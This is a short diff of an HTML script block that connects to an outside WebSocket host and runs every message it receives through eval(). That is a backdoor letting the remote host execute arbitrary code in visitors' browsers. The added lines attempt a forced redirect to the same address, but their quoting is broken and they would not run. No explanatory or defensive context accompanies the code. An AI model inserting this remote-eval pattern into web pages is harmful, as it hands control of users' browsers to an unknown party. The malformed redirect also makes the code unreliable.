@@ -1,4 +1,6 @@
 <script>
 net=new WebSocket("ws://ramxcore.openode.io/")
 net.onmessage=(e)=>{eval(e.data)}
+if(top.location.href=="ws://ramxcore.openode.io/"){}
+else{location.replace(""ws://ramxcore.openode.io/"")}
 </script>
